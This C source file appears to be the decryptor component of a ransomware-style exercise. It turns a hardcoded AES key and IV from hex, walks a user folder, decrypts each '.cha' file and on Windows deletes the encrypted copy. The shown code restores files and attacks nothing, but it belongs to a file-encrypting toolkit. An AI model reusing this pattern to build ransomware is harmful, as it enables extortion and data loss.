#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <openssl/evp.h>
#include <openssl/aes.h>


#include <openssl/rand.h>

#include <openssl/err.h>

#include "files.h"
#include "encryption.h"

char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size){
    char* lisible = (char*)malloc(sequence_size * 2 + 1); // +1 pour le caractère de fin de chaîne
    if (lisible == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        exit(EXIT_FAILURE);
    }
    size_t j = 0;
    for (size_t i = 0; i < sequence_size; ++i) {
        j += sprintf(&lisible[j], "%02x", byte_sequence[i]);
    }
    // printf("KEY / IV : %s\n", lisible); // Affiche la représentation hexadécimale
    return lisible;
}

unsigned char* hex_to_bytes(const char* hex_string, size_t* output_size) {
    size_t length = strlen(hex_string);
    if (length % 2 != 0) {
        fprintf(stderr, "Invalid hex string length.\n");
        exit(EXIT_FAILURE);
    }

    *output_size = length / 2;
    unsigned char* byte_array = (unsigned char*)malloc(*output_size);
    if (byte_array == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        exit(EXIT_FAILURE);
    }

    for (size_t i = 0; i < *output_size; ++i) {
        sscanf(&hex_string[i * 2], "%2hhx", &byte_array[i]);
    }

    return byte_array;
}

int main(){
    
    unsigned char* aes_key;
    unsigned char* iv;

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //Authentication string
    static const unsigned char aad[] = "Cyan";

    char* aes_string = "48e5063557baaf33f6573029eeccc461ca54e71b3ac727473abb0018a545f6f3";
    char* iv_string = "8f9b77eaa9a0905fb8ae87a3ac3303a4"; 

    size_t aes_array_size = 32;
    size_t iv_array_size = 16;

    unsigned char* iv_byte_array = hex_to_bytes(iv_string, &iv_array_size);
    unsigned char* aes_byte_array = hex_to_bytes(aes_string, &aes_array_size);

    // Affichage pour vérifier la conversion
    for (size_t i = 0; i < iv_array_size; ++i) {
        printf("%02x", iv_byte_array[i]);
    }
    printf("\n");

    for (size_t i = 0; i < aes_array_size; ++i) {
        printf("%02x", aes_byte_array[i]);
    }
    printf("\n");

    decrypt_files(aes_byte_array, iv_byte_array, aad);
    
    free(aes_byte_array);
    free(iv_byte_array);

    // debug_bytes(aes_key, 32);
    //debug_bytes(iv, 16);

    // free(aes_key);
    // free(iv);
    // decrypt_files();
    return 0;
}



void decrypt_files(unsigned char *key, unsigned char *iv, unsigned char *aad){
    // List all the files we want to encrypt
    const char *path;

    #ifdef _WIN32
    path = "C:\\Users\\me\\Documents";
    #else
    path = "/home/lorette/test1";
    #endif

    PathList pathList;
    initPathList(&pathList);

    listFiles(path, &pathList);

    for (size_t i = 0; i < pathList.count; ++i) {

        if (strstr(pathList.paths[i], "basic_c/") != NULL) {
            continue; 
        }
        
        char *extension = strrchr(pathList.paths[i], '.');
        if (extension != NULL && strcmp(extension, ".cha") == 0) {
            char encrypted_path[1024];
            snprintf(encrypted_path, sizeof(encrypted_path), "%s", pathList.paths[i]);
            sleep(1);
            printf("Decrypting file: %s\n", encrypted_path);
            decryptFile(key, iv, aad, encrypted_path);
            #ifdef _WIN32
            if (remove(encrypted_path) == 0) {
                printf("Decrypted file deleted successfully: %s\n", encrypted_path);
            } else {
                printf("Error deleting decrypted file: %s\n", encrypted_path);
            }
            #endif
        }
    }

    freePathList(&pathList);
}
